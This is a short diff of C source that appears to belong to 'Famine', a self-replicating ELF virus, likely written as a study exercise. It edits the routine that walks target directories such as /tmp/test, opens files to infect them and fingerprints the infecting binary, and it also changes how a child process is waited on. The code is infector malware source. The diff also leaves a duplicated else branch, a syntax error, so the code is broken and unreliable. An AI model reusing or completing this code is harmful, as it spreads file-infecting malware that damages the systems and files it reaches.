@@ -226,9 +226,13 @@ static int execute_prog(const char *filename, char **envp)
 
 		exit(0);
 	} else if (pid > 0) {
-		int status;
-		wait4(pid, &status, 0, 0);
-		return (status == 0) ? 0 : 1;
+		siginfo_t info;
+
+		waitid(P_PID, pid, &info, WEXITED);
+
+		return (info.si_status == 0) ? 0 : 1;
+	} else {
+		return 1;
 	} else {
 		return 1;
 	}
@@ -305,7 +309,6 @@ void	famine(bootstrap_data_t *bs_data)
 #endif
 
 	uint16_t counter = 0;
-	//char host_name[PATH_MAX];
 
 	const char *paths[] = {
 		STR("/tmp/test"),
@@ -314,16 +317,16 @@ void	famine(bootstrap_data_t *bs_data)
 		NULL
 	};
 
-	//if (self_name(host_name) != 0) {
-	//	return ;
-	//}
+	char host_name[PATH_MAX];
+
+	if (self_name(host_name) != 0) {
+		return ;
+	}
 
 	for (int i = 0; paths[i]; ++i)
 		open_file(paths[i], bs_data, &counter);
 
-	if (counter != 0) {
-		self_fingerprint(bs_data->argv[0], counter);
-	}
+	self_fingerprint(host_name, counter);
 }
 
 void	entrypoint(int argc, char **argv, char **envp)
